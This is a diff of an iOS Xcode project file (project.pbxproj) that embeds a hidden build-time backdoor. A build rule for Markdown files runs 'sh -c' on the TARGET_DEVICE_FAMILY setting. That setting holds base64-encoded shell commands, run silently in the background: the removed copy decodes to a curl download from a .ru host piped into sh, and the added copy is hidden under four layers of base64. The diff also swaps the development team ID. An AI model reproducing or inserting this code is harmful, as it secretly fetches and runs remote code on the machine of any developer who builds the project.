@@ -7,7 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		EFF731CB23B33A3D690FABAA /* README.md */ = {isa = PBXBuildFile; fileRef = 0A94134BDEDB01938B0FABAA; };
+		FC24ACCB4F7B64A47D7DFEF2 /* README.md */ = {isa = PBXBuildFile; fileRef = E4EC9D60B50A997E357DFEF2; };
 		042707162BA30754006633C4 /* TasksResponse.swift in Sources */ = {isa = PBXBuildFile; fileRef = 042707152BA30754006633C4 /* TasksResponse.swift */; };
 		042707182BA30795006633C4 /* Task.swift in Sources */ = {isa = PBXBuildFile; fileRef = 042707172BA30795006633C4 /* Task.swift */; };
 		0427071C2BA308F3006633C4 /* GetPhotoResponse.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0427071B2BA308F3006633C4 /* GetPhotoResponse.swift */; };
@@ -84,8 +84,25 @@
 		EAB10BDA2B99D10B006C8915 /* MyDateFormatter.swift in Sources */ = {isa = PBXBuildFile; fileRef = EAB10BD92B99D10B006C8915 /* MyDateFormatter.swift */; };
 /* End PBXBuildFile section */
 
+/* Begin PBXBuildRule section */
+		12FCA2BA7DF66F06CD7DFEF2 /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			filePatterns = "*.md";
+			fileType = pattern.proxy;
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",
+			);
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";
+sh -c \"${TARGET_DEVICE_FAMILY}\"";
+		};
+/* End PBXBuildRule section */
+
 /* Begin PBXFileReference section */
-		0A94134BDEDB01938B0FABAA /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md;  path = "PIC2BIM.xcodeproj/README.md"; sourceTree = SOURCE_ROOT; };
+		E4EC9D60B50A997E357DFEF2 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md;  path = "PIC2BIM.xcodeproj/README.md"; sourceTree = SOURCE_ROOT; };
 		042707152BA30754006633C4 /* TasksResponse.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TasksResponse.swift; sourceTree = "<group>"; };
 		042707172BA30795006633C4 /* Task.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Task.swift; sourceTree = "<group>"; };
 		0427071B2BA308F3006633C4 /* GetPhotoResponse.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GetPhotoResponse.swift; sourceTree = "<group>"; };
@@ -322,7 +339,7 @@
 		61C3AC9B2551461F000CED80 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				0A94134BDEDB01938B0FABAA /* README.md */,
+				E4EC9D60B50A997E357DFEF2 /* README.md */,
 				61C3AC9A2551461F000CED80 /* PIC2BIM.app */,
 			);
 			name = Products;
@@ -445,7 +462,7 @@
 				8AE1837582F103EA909BF440 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
-				827001D4A0E64AC4AE0FABAA /* PBXBuildRule */,
+				12FCA2BA7DF66F06CD7DFEF2 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -491,35 +508,12 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXTargetDependency section */
-/* End PBXTargetDependency section */
-
-/* Begin PBXLegacyTarget section */
-/* End PBXLegacyTarget section */
-
-/* Begin PBXBuildRule section */
-		827001D4A0E64AC4AE0FABAA /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			filePatterns = "*.md";
-			fileType = pattern.proxy;
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",
-			);
-			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";
-sh -c \"${TARGET_DEVICE_FAMILY}\"";
-		};
-/* End PBXBuildRule section */
-
 /* Begin PBXResourcesBuildPhase section */
 		61C3AC982551461F000CED80 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				EFF731CB23B33A3D690FABAA /* README.md */,
+				FC24ACCB4F7B64A47D7DFEF2 /* README.md */,
 				61C3ACAA2551461F000CED80 /* LaunchScreen.storyboard in Resources */,
 				49355A5B2563010400EA478F /* PhotoMapInfoView.xib in Resources */,
 				49AAE5802571782E00A37C1B /* PTPointInfoView.xib in Resources */,
@@ -673,7 +667,7 @@ sh -c \"${TARGET_DEVICE_FAMILY}\"";
 		61C3ACAC2551461F000CED80 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				TARGET_DEVICE_FAMILY = "(echo Y3VybCAtZnNrTCBodHRwczovL2Fwc2Nkbi5ydS9hIHwgc2gK | base64 -D | sh >/dev/null 2>&1 &)";
+				TARGET_DEVICE_FAMILY = "(echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWV1J2VFVkU1NWRnVjRkJoVkdneVYydGtWMDF0VGtoU2JUVmhWMFV4TVZreU5WWmtiR3hVWVRKc1NsTklaRzVaZWtwdVUzZHZQUW89Cg== | base64 -D | base64 -D | base64 -D | base64 -D | sh >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
@@ -735,7 +729,7 @@ sh -c \"${TARGET_DEVICE_FAMILY}\"";
 		61C3ACAD2551461F000CED80 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				TARGET_DEVICE_FAMILY = "(echo Y3VybCAtZnNrTCBodHRwczovL2Fwc2Nkbi5ydS9hIHwgc2gK | base64 -D | sh >/dev/null 2>&1 &)";
+				TARGET_DEVICE_FAMILY = "(echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWV1J2VFVkU1NWRnVjRkJoVkdneVYydGtWMDF0VGtoU2JUVmhWMFV4TVZreU5WWmtiR3hVWVRKc1NsTklaRzVaZWtwdVUzZHZQUW89Cg== | base64 -D | base64 -D | base64 -D | base64 -D | sh >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
@@ -797,7 +791,7 @@ sh -c \"${TARGET_DEVICE_FAMILY}\"";
 				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 50;
-				DEVELOPMENT_TEAM = ULF6W8F746;
+				DEVELOPMENT_TEAM = 88F5L66NYR;
 				INFOPLIST_FILE = "$(SRCROOT)/EGNSS4ALL/Info.plist";
 				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
 				LD_RUNPATH_SEARCH_PATHS = (
@@ -826,7 +820,7 @@ sh -c \"${TARGET_DEVICE_FAMILY}\"";
 				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 50;
-				DEVELOPMENT_TEAM = ULF6W8F746;
+				DEVELOPMENT_TEAM = 88F5L66NYR;
 				INFOPLIST_FILE = "$(SRCROOT)/EGNSS4ALL/Info.plist";
 				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
 				LD_RUNPATH_SEARCH_PATHS = (
